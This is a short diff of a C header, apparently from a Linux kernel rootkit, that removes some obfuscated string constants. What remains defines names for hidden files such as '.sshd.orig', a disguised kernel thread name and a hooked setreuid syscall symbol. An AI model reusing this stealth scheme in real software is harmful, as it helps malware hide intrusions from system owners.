@@ -56,29 +56,12 @@
  * Hidden files & directories
  */
 
-/** .kovid */
-#define _OBF__KOVID  "\000.\001k\002o\003v\004i\005d"
-
-/** kovid */
-#define _OBF_KOVID  "\000k\001o\002v\003i\004d"
-
-/** kovid.ko */
-#define _OBF_KOVID_KO  "\000k\001o\002v\003i\004d\005.\006k\007o"
-
-/** .kv.ko */
-#define _OBF__KV_KO  "\000.\001k\002v\003.\004k\005o"
-
-/** .o4udk */
-#define _OBF__O4UDK  "\000.\001o\0024\003u\004d\005k"
-
 /** .lm.sh */
 #define _OBF__LM_SH  "\000.\001l\002m\003.\004s\005h"
 
 /** .sshd.orig */
 #define _OBF__SSHD_ORIG  "\000.\001s\002s\003h\004d\005.\006o\007r\010i\011g"
 
-/** .stfu */
-#define _OBF__STFU  "\000.\001s\002t\003f\004u"
 
 /** irq/100_pciehp */
 #define _OBF_IRQ_100_PCIEHP "\000i\001r\002q\003/\0041\0050\0060\007_\010p"    \
@@ -99,14 +82,6 @@
 
 /* __x64_sys_setreuid */
 #define _OBF_X64_SYS_SETREUID  "\000_\001_\002x\0036\0044\005_\006s\007y\010s\011_\012s\013e\014t\015r\016e\017u\020i\021d"
-
-#define _OBF_WHITENOSE  "\000w\001h\002i\003t\004e\005n\006o\007s\010e"
-#define _OBF_PINKNOSE  "\000p\001i\002n\003k\004n\005o\006s\007e"
-#define _OBF_REDNOSE  "\000r\001e\002d\003n\004o\005s\006e"
-#define _OBF_BLACKNOSE  "\000b\001l\002a\003c\004k\005n\006o\007s\010e"
-#define _OBF_GREYNOSE  "\000g\001r\002e\003y\004n\005o\006s\007e"
-#define _OBF_PURPLENOSE  "\000p\001u\002r\003p\004l\005e\006n\007o\010s\011e"
-#define _OBF_BLUENOSE  "\000b\001l\002u\003e\004n\005o\006s\007e"
 
 
 #endif
